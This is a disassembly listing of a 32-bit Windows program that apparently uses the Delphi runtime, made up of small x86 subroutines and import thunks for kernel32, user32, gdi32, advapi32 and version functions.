jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401458
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401460
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401baa
jmp sub_4039a0
sub_401bb1
mov al [ rw-data ]
pop ebp
retn
sub_401c8e
jmp sub_4039a0
sub_401d5c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402370
retn
sub_40235c
jmp sub_4039a0
sub_402502
jmp sub_4039a0
sub_4027a1
jmp sub_4039a0
sub_402864
call sub_406118
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406118
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4028b8
mov [ rw-data ] edx
call sub_403f84
sub_40291c
push eax
push edx
push ecx
call sub_406118
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402910
retn
sub_402938
retn
sub_40298c
retn
sub_402990
push ebx
call sub_406118
mov ebx [ eax + 0x4 ]
call sub_406118
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_4029fc
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a0c
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402aa8
mov edx [ eax + 0x1c ]
call sub_402a60
retn
sub_402b3b
retn
sub_402b3c
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4029b0
retn
sub_402d4c
mov ecx 0xff
call sub_402d58
retn
sub_402d7c
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402d98
jmp sub_402d98
sub_402d95
retn
sub_403125
jmp sub_4039a0
sub_403178
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031d8
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031e4
push ebx
mov ebx eax
mov eax ebx
call sub_403214
call sub_4027b4
mov edx eax
mov eax ebx
call sub_403258
pop ebx
retn
sub_403200
push ebx
mov ebx eax
mov eax ebx
call sub_4032b0
mov eax ebx
call sub_4027d4
pop ebx
retn
sub_403214
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_40323c
call sub_4035d8
test dl dl
jle r-xdata
retn
call sub_4035c0
sub_4032fc
retn
sub_403384
jmp sub_4039a0
sub_40338b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403494
mov eax 0x8000ffff
retn
sub_40349c
retn
sub_4034a0
retn
sub_4034a4
retn
sub_403599
jmp sub_4036ec
sub_40359e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a00
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035c0
sub_4035c0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035c8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035d8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035e8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036b0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036cc
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a99
retn
sub_403bdc
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c6a
jmp sub_4036ec
sub_403cca
jmp sub_4036ec
sub_403ce4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bdc
mov [ rw-data ] 0x0
call sub_403c84
retn
sub_403e1d
retn
sub_403f7f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f84
mov [ rw-data ] eax
call sub_403eac
sub_4041c0
retn
sub_4041fc
retn
sub_40420a
retn
sub_404223
retn
sub_404234
retn
sub_40431b
retn
j_sub_404468#2
jmp sub_404468
sub_4044b1
retn
sub_4044b9
retn
sub_4044fb
retn
sub_404680
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402910
sub_404698
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_4013dc
sub_4047f0
retn
sub_404802
retn
sub_4049f8
mov ecx 0x1
jmp sub_404964
sub_404a02
retn
sub_404a38
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402910
call [ rw-data ]
retn
sub_404b3c
mov ecx 0x1
jmp sub_404a50
sub_404b46
retn
sub_404b48
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402910
call [ rw-data ]
retn
sub_404d6e
retn
sub_404d70
push edx
call sub_4027b4
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_4049f8
pop eax
sub_404d84
push eax
call sub_404b3c
pop eax
call sub_4027d4
retn
sub_404d94
xchg ecx eax
xchg edx ecx
call sub_4040f8
retn
sub_404de8
mov al 0x11
jmp sub_402910
sub_404e13
retn
sub_405054
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c7c
pop ebp
retn 0x4
j_sub_404a50
jmp sub_404a50
sub_405069
retn
sub_40506c
call sub_405320
retn
sub_4053ac
call sub_405384
retn
sub_4056f5
jmp sub_4039a0
sub_405860
call sub_405870
retn
sub_405868
call sub_405890
retn
sub_405870
push ebx
mov ebx eax
mov eax 0x8
call sub_4027b4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40592b
jmp sub_4036ec
sub_40594c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4059c0
jmp sub_4039a0
sub_4059c7
pop ecx
pop ebp
retn
sub_405a40
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405a4c
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405a58
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402910
sub_405a68
call sub_4031e4
mov [ eax + 0x4 ] 0x1
retn
sub_405a9e
mov eax eax
sub_405aa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405adc
test eax eax
jns r-xdata
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov al 0x18
jmp sub_402910
mov edx [ esp ]
call ecx
sub_405dab
jmp sub_4039a0
sub_405db2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e4f
jmp sub_4039a0
sub_405e56
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e9f
jmp sub_4039a0
sub_405ea6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405f6a
jmp sub_4039a0
sub_405f71
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405fc2
jmp sub_4039a0
sub_405fc9
pop ebp
retn
sub_4060a0
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_4060c0
push eax
push 0x40
call LocalAlloc
retn
sub_4060cc
mov eax 0x10
retn
sub_406158
mov eax rw-data
call sub_40594c
retn
sub_4061cd
jmp sub_4039a0
sub_4061d4
pop ebp
retn
sub_4061d8
sub [ rw-data ] 0x1
retn
sub_4061e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4061fc
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406245
jmp sub_4039a0
sub_40624c
pop ebp
retn
sub_406250
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ GlobalSize@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_40651c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ SleepEx@IAT ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CloseEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:CloseEnhMetaFile) ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateEnhMetaFileA
jmp [ CreateEnhMetaFileA@IAT ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetClipRgn
jmp [ __import_lookup_table_8(gdi32:GetClipRgn) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LPtoDP
jmp [ LPtoDP@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetMapMode
jmp [ SetMapMode@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ __import_lookup_table_9(user32:GetClipboardData) ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ __import_lookup_table_9(user32:GetMessageTime) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ __import_lookup_table_9(user32:TranslateMessage) ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406cf0
call GetTickCount
retn
sub_406cf8
xor eax eax
retn
sub_406cfc
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406d0c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406d28
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406d3c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406d74
call sub_406ce4
retn
sub_406d7c
call sub_406ce4
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406f59
jmp sub_4039a0
sub_406f60
pop ebp
retn
sub_406f64
sub [ rw-data ] 0x1
retn
sub_406f91
jmp sub_4039a0
sub_406f98
pop ebp
retn
sub_406f9c
sub [ rw-data ] 0x1
retn
sub_4072d9
jmp sub_4039a0
sub_4072e0
pop ebp
retn
sub_4072e4
sub [ rw-data ] 0x1
retn
sub_407da1
add eax 0xffffffd4
jmp sub_40d3b8
sub_407da9
add eax 0xffffffd4
jmp sub_40d260
sub_407db1
add eax 0xffffffd4
jmp sub_40d2fc
sub_407db9
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a78
sub_407dc3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405aa0
sub_407ea4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
pop ebx
retn
sub_40817c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408144
test eax eax
sete al
pop esi
pop ebx
retn
sub_4086b4
call sub_408690
retn
sub_40874c
push eax
call CloseHandle
retn
sub_40891c
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408930
push esi
mov esi eax
xchg edx eax
call sub_4029b0
mov eax esi
pop esi
retn
sub_408af0
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4027b4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408b04
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408b3c
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4027d4
sub_408ba4
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402910
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408bc8
push ebx
mov ebx eax
mov eax ebx
call sub_403f9c
pop ebx
retn
sub_408f2b
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f9c
pop eax
pop ebx
retn
sub_4091e3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40933e
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40969b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40969b
sub_409794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40445c
mov edx esi
xor ecx ecx
call sub_4095e4
pop esi
pop ebx
retn
sub_409808
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40445c
mov edx esi
mov cl 0x1
call sub_4095e4
pop esi
pop ebx
retn
sub_409ef2
jmp sub_4039a0
sub_409ef9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409fea
jmp sub_4039a0
sub_409ff1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a795
jmp sub_4039a0
sub_40a79c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a824
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a7c8
pop ebp
retn 0x8
sub_40a969
jmp sub_4039a0
sub_40a970
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ae13
jmp sub_4039a0
sub_40ae1a
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b333
jmp sub_4039a0
sub_40b33a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b3e5
jmp sub_4039a0
sub_40b3ec
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b48f
jmp sub_4039a0
sub_40b496
pop esi
pop ecx
pop ebp
retn
sub_40b672
jmp sub_4039a0
sub_40b679
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b6d0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b92c
mov eax [ rw-data ]
call sub_4039d8
retn
sub_40b9ce
jmp sub_4039a0
sub_40ba9c
jmp sub_4039a0
sub_40bb0c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403200
sub_40bca8
jmp sub_4039a0
sub_40bcaf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bcb8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039d8
sub_40bcc5
retn
sub_40bcc6
mov eax eax
push ebp
mov ebp esp
call sub_40bc0c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bcb8
pop ebp
retn 0x4
sub_40bce4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
retn
sub_40bd7c
push ebx
mov ebx eax
mov eax ebx
call sub_40bcfc
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bf4f
jmp sub_4039a0
sub_40bf56
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c01b
jmp sub_4039a0
sub_40c022
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c02c
call sub_40b864
mov eax 0x1
call sub_403f84
sub_40c1b0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c289
jmp sub_4039a0
sub_40c2a6
jmp sub_4039a0
sub_40c2ad
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c358
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
